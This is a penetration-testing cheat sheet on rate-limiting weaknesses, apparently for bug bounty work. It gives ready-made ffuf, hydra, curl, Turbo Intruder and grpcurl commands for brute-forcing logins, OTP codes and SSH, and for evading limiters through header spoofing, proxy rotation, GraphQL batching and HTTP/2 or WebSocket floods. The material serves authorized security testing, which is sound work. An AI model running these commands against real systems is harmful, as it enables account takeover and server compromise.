

# 🛡️ Rate Limiting Vulnerability  —  Cheat Sheet

> **Purpose:** Systematic enumeration, testing, and bypass of rate-limiting controls across web applications, APIs, and network services.
> **Severity Logic:** Critical = Account Takeover / Server Compromise | High = Data Exfiltration / Business Impact | Medium = Operational Disruption / Spam

---

## 📋 Table of Contents

1. [Severity Classification Matrix](#severity-classification-matrix)
2. [CRITICAL — Authentication & Account Takeover](#critical)
3. [HIGH — Internal Systems & Sensitive Operations](#high)
4. [MEDIUM — Public-Facing & Spam-Only Features](#medium)
5. [Rate Limit Bypass Techniques](#bypass-techniques)
6. [Advanced Evasion (2023–2025)](#advanced-evasion)
7. [Tools & Automation](#tools)
8. [Quick Reference Checklist](#checklist)

---

<a name="severity-classification-matrix"></a>
## 🔴 Severity Classification Matrix

| Severity | Target | Primary Impact | CVSS Range |
|----------|--------|--------------|------------|
| **CRITICAL** | Login, OTP/2FA, Password Reset | Full Account Takeover | 9.0–10.0 |
| **CRITICAL** | Internal Password Check API | Stealth Credential Brute-Force | 8.0–9.0 |
| **CRITICAL** | SSH (Port 22) | Server Compromise | 9.0–10.0 |
| **HIGH** | Abuse/Report Systems | False Takedowns, Trust Abuse | 7.0–8.0 |
| **MEDIUM** | Contact Forms, Comments | Spam, Storage Abuse, DoS | 4.0–6.9 |

---

<a name="critical"></a>
## 🔴 CRITICAL SEVERITY

---

### 1. No Rate Limit on Login Page
**Impact:** ➡️ **Account Takeover (ATO)** | **CVSS:** 9.1

#### What is it?
The application allows unlimited password guesses against user accounts without implementing throttling, CAPTCHA, or account lockout mechanisms.

#### Why it matters:
Without rate limiting, an attacker can systematically guess passwords using wordlists or credential stuffing attacks. Even strong passwords can be compromised if the attacker has sufficient time and a targeted wordlist.

#### Step-by-Step Testing:
1. Navigate to the login page (`/login`, `/auth`, `/signin`)
2. Intercept the authentication request using **Burp Suite** or **OWASP ZAP**
3. Identify the parameter carrying the password (e.g., `password`, `pass`, `pwd`)
4. Send the request to **Burp Intruder** or use **ffuf** on the command line
5. Configure a payload position on the password field
6. Load a wordlist (e.g., `rockyou.txt`, `SecLists` credentials)
7. Run the attack with moderate concurrency (10–20 threads)
8. Monitor responses for:
   - Different status codes (`200` vs `401`)
   - Response length changes
   - Redirects to dashboard (`/home`, `/profile`)
   - Time-based differences (slow response = wrong password on some systems)

#### Vulnerability Indicators:
- No CAPTCHA challenge after multiple failures
- No account lockout after 5+ failed attempts
- Identical response time for valid vs invalid credentials
- No `X-RateLimit-*` headers in response

#### Example Request (ffuf):
```bash
ffuf -u https://target.com/login.php \
  -w /usr/share/wordlists/rockyou.txt \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 200,302 -fc 401
```

---

### 2. No Rate Limit on OTP / 2FA Verification
**Impact:** ➡️ **Full Account Takeover** | **CVSS:** 9.8

#### What is it?
One-Time Password (OTP) fields (SMS, email, TOTP, backup codes) accept unlimited verification attempts without throttling, allowing brute-force of short numeric codes.

#### Why it matters:
Most OTPs are 4–6 digits (10,000–1,000,000 combinations). At 100 requests/second, a 6-digit OTP can be brute-forced in ~2.7 hours. If the OTP is 4 digits, it takes under 2 minutes.

#### Step-by-Step Testing:
1. Log in with valid credentials to reach the OTP/2FA screen
2. Request an OTP to be sent to your test account
3. Intercept the OTP verification request (`/verify-otp`, `/2fa/confirm`, `/api/mfa/verify`)
4. Send to Burp Intruder or use ffuf
5. Create a numeric payload: `000000` to `999999` (or `0000` to `9999`)
6. Run with high concurrency (50–100 threads if no blocking observed)
7. Watch for:
   - `200 OK` with session token (success)
   - `401 Unauthorized` with different error messages
   - Response containing `token`, `session`, `redirect`

#### Vulnerability Indicators:
- No attempt limit after 10+ wrong OTPs
- OTP does not expire after 5–15 minutes
- Same OTP can be reused multiple times
- No notification to user about failed attempts

#### Example Request (ffuf):
```bash
ffuf -u https://target.com/api/v2/verify-otp \
  -w <(seq -w 000000 999999) \
  -X POST \
  -d '{"code":"FUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <session_token>" \
  -mr "token" -fc 401
```

#### Pro Tip:
> Even if rate limiting appears active after 20 attempts, **always test the correct OTP immediately after the limit triggers**. Some systems return `429` for wrong guesses but still process the correct OTP with `200`.

---

### 3. No Rate Limit on Password Reset / Forgot Password
**Impact:** ➡️ **Account Takeover + Email Bombing** | **CVSS:** 8.5

#### What is it?
The password reset endpoint allows unlimited reset link/OTP requests to be sent to a victim's email, enabling both account takeover (if the reset token/OTP is brute-forced) and email bombing (DoS against the victim's inbox).

#### Why it matters:
If the reset token is predictable (e.g., incremental, timestamp-based, short length), an attacker can brute-force it. Even if the token is strong, spamming reset emails can be used for harassment or to hide malicious activity in a flooded inbox.

#### Step-by-Step Testing:
1. Navigate to "Forgot Password" (`/forgot-password`, `/reset-password`, `/recover`)
2. Enter a test email address and intercept the request
3. Send the same request 50–100 times rapidly
4. Check your email inbox for:
   - Number of reset emails received
   - Whether they contain identical or different tokens
   - Token format and entropy (length, randomness)
5. If a token is received, analyze its structure:
   - Is it numeric? Try brute-forcing.
   - Is it a UUID? Likely secure, but check expiration.
   - Does it contain timestamps? May be predictable.
6. Test token expiration by waiting 1 hour, 24 hours, then using it

#### Vulnerability Indicators:
- 50+ reset emails received in under 1 minute
- Reset token is numeric and < 8 digits
- Token does not expire after 15–60 minutes
- No "recent reset request" notification to user
- Same token sent in every email (reusable)

#### Example Request:
```http
POST /api/v1/reset-password HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"victim@target.com"}
```

---

### 4. No Rate Limit on Internal Password Check Endpoint
**Impact:** ➡️ **Stealth Credential Brute-Force** | **CVSS:** 8.2

#### What is it?
Some applications expose an internal API endpoint that validates passwords *before* the actual login submission (e.g., for "password strength" checks, or client-side validation that leaks to the backend). This endpoint often lacks the same security controls as the main login.

#### Why it matters:
Because this endpoint is not the "official" login, it frequently lacks:
- Logging and monitoring
- Rate limiting
- CAPTCHA
- Account lockout

Attackers can brute-force here silently, then use the discovered password on the real login.

#### Step-by-Step Testing:
1. Use Burp Suite to spider the application or manually browse all features
2. Look for JavaScript files making API calls to endpoints like:
   - `/api/check-password`
   - `/api/validate-credentials`
   - `/api/auth/verify`
   - `/internal/password-check`
3. Intercept the request and send it to Intruder
4. Brute-force the password parameter using a wordlist
5. Compare response behavior with the main login:
   - Faster responses (no session creation overhead)
   - Different error messages ("weak password" vs "invalid credentials")
   - No lockout after 100+ attempts

#### Vulnerability Indicators:
- Endpoint returns `true`/`false` or `valid`/`invalid` without lockout
- Response time varies based on password correctness (timing attack)
- No `Set-Cookie` or session headers (indicates pre-validation)
- Endpoint is not documented in public API docs

#### Example Request:
```http
POST /api/internal/check-password HTTP/1.1
Host: target.com
Authorization: Bearer <user_token>
Content-Type: application/json

{"password":"FUZZ"}
```

---

### 5. No Rate Limit on SSH (Port 22)
**Impact:** ➡️ **Server Compromise** | **CVSS:** 9.8

#### What is it?
The SSH service on the server does not implement temporary IP bans (fail2ban), rate limiting, or key-based authentication enforcement, allowing unlimited password guesses.

#### Why it matters:
SSH is a direct shell access protocol. Compromising it gives the attacker full control over the server. Brute-forcing SSH is one of the most common attack vectors in automated botnets.

#### Step-by-Step Testing:
1. Scan the target for open port 22 (`nmap -p 22 target.com`)
2. Attempt to connect: `ssh root@target.com`
3. Use **Hydra** or **Medusa** for automated brute-forcing:
   ```bash
   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
   ```
4. Run for 100+ attempts and observe:
   - Does the connection drop after N attempts?
   - Is there a delay (`Connection closed by remote host`) after failures?
   - Does `fail2ban` trigger (check with `iptables -L` if you have access)
5. Try common username/password combinations:
   - `root:root`, `admin:admin`, `user:password`
   - Default credentials for the server OS/software

#### Vulnerability Indicators:
- 100+ failed attempts with no connection drop
- No `fail2ban` or `iptables` rules visible
- Password authentication enabled (not key-only)
- `PermitRootLogin yes` in `/etc/ssh/sshd_config`
- Default or weak credentials accepted

#### Mitigation Check:
```bash
# Check if fail2ban is running
systemctl status fail2ban
# Check SSH config for key-only auth
grep -E "PasswordAuthentication|PermitRootLogin" /etc/ssh/sshd_config
```

---

<a name="high"></a>
## 🟠 HIGH SEVERITY

---

### 6. No Rate Limit on Comment / Content Reports
**Impact:** ➡️ **False Takedowns + Trust Abuse** | **CVSS:** 7.5

#### What is it?
The "Report" feature on comments, posts, or user-generated content allows unlimited submissions. This can be abused to trigger automatic moderation systems, causing legitimate content to be removed.

#### Why it matters:
Many platforms use automated moderation: if a post receives N reports, it is auto-hidden or the account is suspended. Attackers can weaponize this to censor competitors, harass users, or damage platform reputation.

#### Step-by-Step Testing:
1. Find a piece of content (comment, post, video) with a "Report" button
2. Intercept the report submission request (`/report`, `/flag`, `/abuse`)
3. Send the same request 20–50 times rapidly
4. Check if:
   - The content is automatically hidden/removed
   - The content creator receives a warning/suspension
   - Your account receives any rate limit warning
5. Try varying the `reason` parameter to test different report categories

#### Vulnerability Indicators:
- Content disappears after 5–10 reports from the same account
- No cooldown between reports
- No verification of report legitimacy
- Automated email to content creator without human review

#### Example Request:
```http
POST /api/v1/report HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"content_id":"12345","reason":"spam","category":"abuse"}
```

---

<a name="medium"></a>
## 🟡 MEDIUM SEVERITY

---

### 7. No Rate Limit on Contact Us / Support Forms
**Impact:** ➡️ **Spam + Operational Disruption** | **CVSS:** 5.3

#### What is it?
Contact forms, support ticket submissions, or feedback endpoints accept unlimited submissions, allowing spam that overwhelms support staff or automated ticketing systems.

#### Why it matters:
While less critical than authentication bypasses, this can:
- Flood support inboxes, delaying response to real users
- Consume support staff time and resources
- Be used to hide malicious activity (e.g., phishing reports buried in spam)
- In some cases, trigger automated responses that consume email quota

#### Step-by-Step Testing:
1. Navigate to the "Contact Us" or "Support" page
2. Fill out the form and intercept the submission
3. Send the identical request 20–50 times
4. Check:
   - Do you receive 50 confirmation emails?
   - Does the support system show 50 identical tickets?
   - Is there any CAPTCHA or delay?
5. Try automated submission with a script:
   ```bash
   for i in {1..50}; do
     curl -X POST https://target.com/contact \
       -d "name=test&email=test@example.com&message=spam"
   done
   ```

#### Vulnerability Indicators:
- 50+ tickets created in under 1 minute
- No email verification required
- No CAPTCHA or honeypot field
- Auto-response email sent for every submission

---

### 8. No Rate Limit on Comments / Reviews
**Impact:** ➡️ **Spam + Storage Abuse** | **CVSS:** 4.8

#### What is it?
Comment sections, review systems, or forum posts allow rapid, unlimited submissions without throttling, enabling spam campaigns and database bloat.

#### Why it matters:
Spam comments degrade user experience, can contain malicious links (phishing, malware), and inflate database size. On platforms with search indexing, spam can manipulate SEO or drown legitimate content.

#### Step-by-Step Testing:
1. Find a post, product, or article with a comment section
2. Post a test comment and intercept the request
3. Re-send the request 20–100 times with slight variations
4. Check:
   - Are all comments published immediately?
   - Is there any moderation queue?
   - Does the user account get flagged?
5. Test for automated posting with a script

#### Vulnerability Indicators:
- 100+ comments from the same account in 1 minute
- No CAPTCHA on submission
- No "posting too fast" warning
- Comments appear instantly without moderation
- No rate limit headers in response

---

<a name="bypass-techniques"></a>
## 🔓 Rate Limit Bypass Techniques

> **Principle:** Rate limiters track requests by IP, session, account, or a combination. If you can change the tracked identifier, you bypass the limit.

---

### A. IP Origin Manipulation via Headers

#### What is it?
Some applications use client-provided headers to determine the "real" IP address (for logging, geo-location, or rate limiting). If the application trusts these headers blindly, you can spoof a new IP for every request.

#### Why it works:
When an application sits behind a load balancer, CDN, or reverse proxy, the real client IP is often passed via headers like `X-Forwarded-For`. If the rate limiter uses this header instead of the actual TCP connection IP, spoofing it resets the limit.

#### Step-by-Step Testing:
1. Identify if the application is behind a proxy (check for `X-Forwarded-For` in responses or use `whatweb`/`wappalyzer`)
2. Send a request with a spoofed header:
   ```http
   X-Forwarded-For: 1.2.3.4
   ```
3. Send 10+ requests with the same payload but different `X-Forwarded-For` values
4. If none are blocked → **Bypass confirmed**

#### Common Headers to Test:
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Originating-IP: 0.0.0.0
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1  # (note the typo — some systems check this)
```

#### Double Header Technique:
```http
X-Forwarded-For: 
X-Forwarded-For: 127.0.0.1
```
> Some parsers take the *last* value, others the *first*. Sending both can confuse the parser into using your spoofed IP.

#### Example ffuf Command:
```bash
ffuf -u https://target.com/login.php \
  -w wordlist.txt \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Originating-IP: 1.1.1.1"
```

---

### B. Status Code Bypass (429 → 403)

#### What is it?
When you hit a rate limit, the server returns `429 Too Many Requests`. However, some implementations have weak logic: if you modify the request slightly, the rate limiter may not recognize it as the same request pattern.

#### Why it works:
Rate limiters often use request signatures (method + path + parameters). Changing the signature slightly can trick the limiter into treating it as a new request.

#### Step-by-Step Testing:
1. Trigger a `429` response by sending rapid requests
2. Modify the request:
   - Add a random query parameter: `?foo=bar`
   - Change the case of the path: `/LOGIN` instead of `/login`
   - Add a trailing slash: `/login/`
   - Change `Content-Type` header
   - Add extra whitespace in the body
3. If the modified request returns `200` instead of `429` → **Bypass confirmed**

---

### C. Endpoint Variation & Path Confusion

#### What is it?
Rate limiters may be configured for specific paths but miss variations (case changes, version differences, trailing slashes, alternate spellings).

#### Why it works:
API gateways and WAFs often use exact path matching or regex that doesn't cover all variations. If `/api/v1/login` is rate-limited, `/api/V1/login` or `/api/v1/login/` might not be.

#### Step-by-Step Testing:
1. Identify the rate-limited endpoint (e.g., `/api/v3/sign-up`)
2. Test variations:
   - Case changes: `/Sign-Up`, `/SIGN-UP`, `/Api/V3/Sign-Up`
   - Trailing slashes: `/sign-up/`, `/sign-up//`
   - Different versions: `/api/v1/sign-up`, `/api/v2/sign-up`, `/api/sign-up`
   - Encoding: `/sign%2dup`, `/sign-up%00`
   - Path traversal: `/api/v3/../v3/sign-up`
3. If any variation accepts requests without `429` → **Bypass confirmed**

---

### D. Blank Character Injection

#### What is it?
Inserting URL-encoded whitespace or null bytes into parameters can cause the rate limiter's parser to see a different key while the application backend processes it as the same value.

#### Why it works:
Rate limiters often hash or normalize request parameters. If the normalizer strips null bytes but the backend doesn't, the limiter sees `email=test@example.com` while the backend sees `email=test@example.com%0a` as the same email.

#### Characters to Test:
```
%00    (Null byte)
%0d%0a (CRLF)
%0d    (Carriage return)
%0a    (Line feed)
%09    (Tab)
%0c    (Form feed)
%20    (Space)
```

#### Example:
```http
POST /verify-otp HTTP/1.1
Host: target.com
Content-Type: application/json

{"code":"1234%0a"}
```
> The rate limiter may track `code=1234%0a` as a different attempt than `code=1234`, but the backend may normalize it to `1234`.

---

### E. Header Rotation (User-Agent & Cookies)

#### What is it?
Some rate limiters combine IP with other headers (User-Agent, session cookie) to create a fingerprint. Rotating these headers can make each request appear unique.

#### Why it works:
If the limiter key is `IP + User-Agent + Cookie`, changing any one component resets the counter. This is common in poorly configured WAFs.

#### Step-by-Step Testing:
1. Send 10 requests with identical headers → observe `429`
2. Send 10 more requests with:
   - Different `User-Agent` each time
   - Cleared or rotated cookies
   - Different `Accept-Language` headers
3. If no `429` → **Bypass confirmed**

#### Example ffuf with Header Rotation:
```bash
ffuf -u https://target.com/login \
  -w passwords.txt \
  -H "User-Agent: FUZZ" \
  -w2 /usr/share/wordlists/user-agents.txt \
  -mode clusterbomb
```

---

### F. API Gateway Parameter Abuse

#### What is it?
Some API gateways rate-limit based on the combination of endpoint + specific parameters. Adding non-functional parameters can make each request appear unique to the gateway.

#### Why it works:
The gateway creates a cache key or rate limit key from the full URL including query parameters. Adding `?cachebuster=1`, `?t=123456` makes each URL unique, bypassing the limiter.

#### Example:
```http
POST /resetpwd?someparam=1 HTTP/1.1
POST /resetpwd?someparam=2 HTTP/1.1
POST /resetpwd?someparam=3 HTTP/1.1
```
> Each request has a different URL, so the gateway treats them as separate requests.

---

### G. Session/Account Rotation

#### What is it?
If rate limiting is per-account or per-session, distributing the attack across multiple accounts resets the counter for each.

#### Why it works:
Per-user rate limits are designed to prevent abuse from a single user. If the attacker controls 100 accounts, they get 100x the allowed requests.

#### Step-by-Step Testing:
1. Create or obtain multiple test accounts (5–10 minimum)
2. From Account A, send 10 login attempts → observe `429`
3. Immediately switch to Account B, send 10 more attempts
4. If Account B is not blocked → **Per-account limit confirmed, bypassable with rotation**

#### Practical Implementation:
Use Burp Suite's **Pitchfork** attack type:
- Position 1: Username list (Account A, B, C...)
- Position 2: Password list
- Configure to rotate credentials every N attempts
- Ensure "Follow redirects" is enabled to maintain session state

---

### H. Proxy Networks & IP Rotation

#### What is it?
Using a pool of proxy servers to distribute requests across many IP addresses, each with its own rate limit quota.

#### Why it works:
IP-based rate limiters assign a quota to each IP. With 1000 proxies, you get 1000x the quota.

#### Tools:
- **Residential proxy services** (Bright Data, Oxylabs, Smartproxy)
- **AWS API Gateway** (FireProx — creates disposable endpoints with unique IPs)
- **Proxychains** with open proxy lists
- **Tor** (slow but free, rotates every 10 minutes)

#### Example with FireProx:
```bash
# FireProx creates AWS API Gateway endpoints
python fireprox.py --access_key AKIA... --secret_key ... \
  --region us-east-1 --command create --url https://target.com/login
# Every request goes through a different AWS IP
```

#### Example with Proxychains:
```bash
for p in $(cat proxies.txt); do
  HTTPS_PROXY=$p curl -s -X POST https://target.com/login \
    -d "user=admin&pass=guess" &
done
wait
```

---

<a name="advanced-evasion"></a>
## 🚀 Advanced Evasion Techniques (2023–2025)

---

### I. HTTP/2 Multiplexing & Request Pipelining

#### What is it?
HTTP/2 allows multiple requests (streams) to be sent over a single TCP connection. Many rate limiters count TCP connections or HTTP/1.1 requests, not HTTP/2 streams. This means 100 requests in 1 connection = 1 request to the limiter.

#### Why it works:
Legacy rate limiters and WAFs were designed for HTTP/1.1 where each request = new connection or at least a new request cycle. HTTP/2 multiplexing breaks this assumption.

#### Step-by-Step Testing:
1. Check if the target supports HTTP/2:
   ```bash
   curl -I --http2 https://target.com
   ```
2. Send multiple requests over a single HTTP/2 connection:
   ```bash
   seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
     -H "Content-Type: application/json" \
     -d '{"code":"@"}' https://target/api/v2/verify
   ```
3. Observe if all 100 requests are processed without `429`

#### Turbo Intruder Configuration:
```python
# Turbo Intruder script for HTTP/2 multiplexing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=True)
    for word in wordlists['default']:
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    if req.status != 429:
        table.add(req)
```

---

### J. GraphQL Aliases & Batched Operations

#### What is it?
GraphQL allows multiple queries/mutations in a single request using aliases. The server executes every alias, but the rate limiter often counts only one request.

#### Why it works:
The rate limiter sees `POST /graphql` with one body. The GraphQL server sees 20 separate operations. This is a 20:1 bypass ratio.

#### Step-by-Step Testing:
1. Identify if the target uses GraphQL (`/graphql`, `/api/graphql`)
2. Craft a batched mutation with aliases:
   ```graphql
   mutation bruteForceOTP {
     a: verify(code:"111111") { token }
     b: verify(code:"222222") { token }
     c: verify(code:"333333") { token }
     d: verify(code:"444444") { token }
     # ... add up to 100 aliases ...
   }
   ```
3. Send the request and analyze the response:
   - One alias will return `200` with a token when the correct code is hit
   - Others may return `429` or error, but the correct one still succeeds

#### Pro Tip:
> PortSwigger's research on "GraphQL Batching & Aliases" (2023) documented this extensively. Many bug bounty programs now explicitly test for this.

---

### K. REST API Batch/Bulk Endpoints

#### What is it?
Some REST APIs expose batch endpoints (`/v2/batch`, `/api/bulk`) that accept an array of operations. If the rate limiter only monitors the legacy endpoints, wrapping multiple operations in one bulk request bypasses it.

#### Why it works:
The rate limiter is configured for `/login` but not for `/batch`. The batch endpoint internally calls `/login` 20 times, but the limiter only sees one request to `/batch`.

#### Example Request:
```http
POST /api/v2/batch HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"123"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"456"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"789"}}
]
```

---

### L. Sliding Window Timing Attack

#### What is it?
Token-bucket or fixed-window rate limiters reset on a time boundary (e.g., every 60 seconds). If you know the window, you can send a burst just before reset, then another burst immediately after, doubling your throughput.

#### Why it works:
The limiter allows N requests per window. If you send N-1 requests at second 59, the bucket resets at second 60, and you can send N more requests immediately.

#### Step-by-Step Testing:
1. Trigger rate limiting and observe the `X-RateLimit-Reset` header
2. Note the reset time (e.g., 60 seconds)
3. Send the maximum allowed requests at T=55 seconds
4. At T=60 seconds (immediately after reset), send another full burst
5. If both bursts succeed → **Timing bypass confirmed**

#### Visual Representation:

```
|<-- 60 s window -->|<-- 60 s window -->|
     ######                ######
     (burst at T=55)       (burst at T=60)
```
> This simple optimization can more than double throughput without any other bypass technique.

---

### M. WebSocket / gRPC Streaming Upgrade

#### What is it?
Many edge rate limiters only inspect the initial HTTP request. Once upgraded to WebSocket (HTTP 101) or gRPC streaming, subsequent messages are no longer separate HTTP requests and often bypass per-request counters.

#### Why it works:
WebSocket frames and gRPC stream messages are not HTTP requests. WAFs and rate limiters that operate at the HTTP layer cannot inspect them without deep packet inspection.

#### Step-by-Step Testing:
1. Check if the target exposes WebSocket or gRPC alternatives:
   - WebSocket: `wss://target.com/api/verify-ws`
   - gRPC: `target.com:50051` (often requires reflection)
2. Establish the connection:
   ```bash
   # WebSocket flooding
   seq -w 000000 000999 | websocat -n ws://target.tld/api/verify-ws
   ```
3. Send multiple messages within the same connection
4. If no rate limiting is applied to subsequent messages → **Bypass confirmed**

#### gRPC Example:

```bash
grpcurl -d @ -plaintext target.tld:50051 service.VerifyOTP/Stream <<'EOF'
{ "code": "111111" }
{ "code": "222222" }
{ "code": "333333" }
EOF
```

> **Cloudflare's own documentation states:** Only the initial upgrade request is subject to WAF/rate-limiting rules; frames sent afterwards are opaque.

---

### N. CDN PoP-Sharded Counter Exploitation

#### What is it?
Some CDNs (e.g., Cloudflare) shard rate-limit counters per Point of Presence (PoP/data center) rather than globally. Each data center maintains an independent bucket for the same key.

#### Why it works:
If you route requests through egress nodes in different regions, each PoP sees a different source and maintains its own counter. 10 PoPs = 10x the rate limit.

#### Step-by-Step Testing:
1. Identify the CDN provider (check headers like `CF-RAY`, `X-Cache`)
2. Use a proxy pool with geographic diversity (residential proxies, cloud VMs in different regions)
3. Send requests from:
   - US-East, US-West, EU-Central, Asia-Pacific, etc.
4. If requests from different regions are not blocked → **PoP sharding bypass confirmed**

#### Quick Test with Proxy Rotation:

```bash
for p in $(cat country_rotating_proxies.txt); do
  HTTPS_PROXY=$p curl -s -X POST https://target/api/login \
    -d @payload.json &
done
wait
```

> **Important:** This only works if the limiter key is IP-based. If it's per-account, you must also rotate user IDs/session tokens.

---

<a name="tools"></a>
## 🛠️ Tools & Automation

| Tool | Purpose | Link |
|------|---------|------|
| **ffuf** | Fast web fuzzer with header support | `https://github.com/ffuf/ffuf` |
| **Burp Suite** | Web proxy with Intruder, Turbo Intruder extension | `https://portswigger.net/burp` |
| **Turbo Intruder** | High-performance HTTP/2 attack engine | BApp Store in Burp |
| **IPRotate** | Burp extension for proxy rotation | BApp Store |
| **FireProx** | AWS API Gateway proxy rotation | `https://github.com/ustayready/fireprox` |
| **hashtag-fuzz** | Fuzzer with header randomization, proxy rotation | `https://github.com/Hashtag-AMIN/hashtag-fuzz` |
| **Hydra** | Network login cracker (SSH, HTTP, etc.) | `https://github.com/vanhauser-thc/thc-hydra` |
| **Medusa** | Parallel network login auditor | `https://github.com/jmk-foofus/medusa` |
| **websocat** | WebSocket client for testing | `https://github.com/vi/websocat` |
| **grpcurl** | gRPC command-line tool | `https://github.com/fullstorydev/grpcurl` |
| **proxychains** | Force TCP connections through proxies | `https://github.com/haad/proxychains` |
| **seq** | Generate numeric sequences for OTP brute-forcing | Built-in Unix tool |

---

<a name="checklist"></a>
## ✅ Quick Reference Testing Checklist

### Phase 1: Discovery
- [ ] Map all authentication endpoints (login, OTP, 2FA, password reset)
- [ ] Identify internal/password-check APIs via JavaScript analysis
- [ ] Check for SSH exposure on port 22
- [ ] Map all user-input forms (contact, comments, reports)
- [ ] Check for GraphQL, WebSocket, gRPC endpoints
- [ ] Identify CDN/WAF provider and configuration

### Phase 2: Basic Rate Limit Testing
- [ ] Send 50 rapid requests to each endpoint
- [ ] Observe status codes (`429`, `403`, `503`)
- [ ] Check for `X-RateLimit-*` headers
- [ ] Test for account lockout after N attempts
- [ ] Test for CAPTCHA triggers
- [ ] Measure response time differences (timing attacks)

### Phase 3: Bypass Testing
- [ ] Test IP header spoofing (`X-Forwarded-For`, `X-Originating-IP`, etc.)
- [ ] Test double header injection
- [ ] Test endpoint variations (case, version, trailing slash)
- [ ] Test blank character injection (`%00`, `%0a`, `%20`)
- [ ] Test header rotation (User-Agent, cookies)
- [ ] Test parameter abuse (`?cachebuster=1`)
- [ ] Test session/account rotation
- [ ] Test proxy/IP rotation

### Phase 4: Advanced Evasion
- [ ] Test HTTP/2 multiplexing
- [ ] Test GraphQL alias batching
- [ ] Test REST bulk/batch endpoints
- [ ] Test sliding window timing
- [ ] Test WebSocket/gRPC streaming
- [ ] Test CDN PoP sharding

### Phase 5: Validation
- [ ] Confirm bypass works consistently (10+ attempts)
- [ ] Document bypass method with exact requests/responses
- [ ] Calculate impact (requests/second, time to compromise)
- [ ] Check if bypass affects other endpoints
- [ ] Verify if the bypass is detectable in logs

---

## 📌 Final Notes

> **Golden Rule:** Always test the **correct** credential/OTP immediately after triggering a rate limit. Some systems block wrong attempts but still process the correct ones.

> **Scope Awareness:** Rate limit testing can generate significant traffic. Always ensure you have explicit authorization and use controlled wordlists to avoid unintended Denial of Service.

> **Documentation:** For bug bounty reports, include:
> - Exact endpoint and HTTP method
> - Rate limit policy (if disclosed)
> - Bypass technique with proof-of-concept
> - Impact calculation (time to brute-force)
> - Screenshot of successful bypass

---

*Cheat Sheet Version: 2.0 
*Sources: PortSwigger Research, Cloudflare Docs, Bug Bounty Methodologies, Community Research*

